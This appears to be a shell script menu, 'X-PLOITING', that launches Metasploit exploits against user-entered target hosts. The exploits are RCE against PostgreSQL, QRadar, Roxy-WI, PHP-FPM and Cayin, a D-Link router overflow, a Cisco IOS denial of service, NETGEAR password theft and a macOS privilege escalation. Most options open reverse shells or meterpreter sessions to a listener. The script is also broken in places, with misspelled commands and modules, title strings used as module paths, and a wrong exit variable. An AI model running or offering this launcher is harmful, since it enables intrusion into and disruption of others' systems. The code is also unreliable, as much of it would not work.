#!/bin/sh
#
#
#

# STARTING

clear
echo "Loading." 
    sleep 1.0
    clear
echo  "Loading.." 
    sleep 1.0
    clear
echo "Loading..." 
    sleep 1.0
    clear
echo "Loading...." 
    sleep 1.0
clear
    sleep 0.5
clear
figlet -f big "X-PLOITING" 
sleep 1.0
echo 
echo "1.) PostgreSQL COPY FROM PROGRAM Command Execution" 
    sleep 0.5
echo "2.) Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow" 
    sleep 0.5
echo "3.) IBM QRadar SIEM Unauthenticated Remote Code Execution" 
    sleep 0.5
echo "4.) Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE" 
    sleep 0.5
echo "5.) PHP-FPM Underflow RCE" 
    sleep 0.5
echo "6.) Cisco IOS Telnet Denial of Service" 
    sleep 0.5
echo "7.) NETGEAR Administrator Password Disclosure" 
    sleep 0.5
echo "8.) Cayin xPost wayfinder_seqid SQLi to RCE" 
    sleep 0.5
echo "9.) Mac OS X libxpc MITM Privilege Escalation" 
    sleep 0.5
echo "10.) EXIT"
    sleep 0.5
    read answer;
if [ $answer = 1 ]; then
    echo "Enter you're LHOST:" 
        read lhost;
    echo "Enter target RHOST(S):" 
        read rhosts;
    echo "Enter target port to exploit:" 
        read rport;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use multi/postgres/postgres_cpoy_from_program_cmd_exec;
    set payload cmd/unix/reverse_perl;
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 2 ]; then
    echo "Enter listen LHOST (iface: eth0/wlan0):" 
        read lhost;
    echo "Enter target RHOST(S) (target IP):" 
        read rhosts;
    echo "Enter target RPORT (taregt port):"
        read rport;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use linux/http/dlink_hnap_login_bof;
    set payload linux/mipsbe/meterpreter/reverse_tcp;
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 3 ]; then
    echo "Enter listen LHOST (iface; eth0/wlan0):" 
        read lhost;
    echo "Enter target RHOST(S) (target IP):"  
        read rhosts;
    echo "Enter target RPORT (target port) (80/443, norm 443):" 
        read rport;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use IBM QRadar SIEM Unauthenticated Remote Code Execution;
    set payload generic/shell_reverse_tcp;
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 4 ]; then
    echo "Enter LHOST (eth0/wlan0 | 0.0.0.0):" 
        read lhost;
    echo "Enter RHOST(S) (target IP or Website):"
        read rhosts;
    echo "Enter RPORT (target port; 443):" 
        read rport;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE;
    set payload cmd/unix/python/meterpreter/reverse_tcp;
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 5 ]; then
    echo "Enter LHOST (iface, eth0/wlan0 | 0.0.0.0):" 
        read lhost;
    echo "Enter RHOST(S) (target IP / Website):" 
        read rhosts;
    echo  "Enter RPORT (target port, norm 80):"
        read rport:
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use PHP-FPM Underflow RCE;
    set payload php/meterpreter/reverse_tcp
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 6 ]; then
    echo "Enter RHOST(S) (taregt IP(s)):" 
        read rhosts;
    cd selfcoded-MSF-Xploits
    msfconsole -q -x "use auxiliary/dos/cisco/ios_telnet_rocem;
    set rhosts $rhosts;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 7 ]; then
    echo "Enter RHOST(S) (target IP(S))"
        read rhosts;
    echo "Enter RPORT (target Port):" 
        read rport;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use auxiliary/gather/netgear_password_disclosure;
    set RHOSTS $rhosts;
    setRPORT $rport;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 8 ]; then
    echo "Enter LHOST (iface, eth0/wlan0):" 
        read lhost;
    echo "Enter RHOST(S) (target IP(S)):"
        read rhosts;
    echo "Enter RPORT (target port):"
        read rport;
    msfcsonole -q -x "use exploit/windows/http/cayin_xpost_sql_rce;
    cd selfhosted-MSF-Xploits
    set LHOST $lhost;
    set RHOSTS $rhosts;
    set RPORT $rport;
    run"
    cd ..
    echo "Exploit completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 9 ]; then
    echo "Enter LHOST (iface, eth0/wlan0):" 
        read lhost;
    cd selfhosted-MSF-Xploits
    msfconsole -q -x "use exploit/osx/local/libxpc_mitm_ssudo;
    set LHOST $lhost;
    run"
    cd ..
    echo "Exploit completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 10 ]; then
    cd ..
    ./BashScripting.sh
fi
clear
./menu4.sh
/bin/sh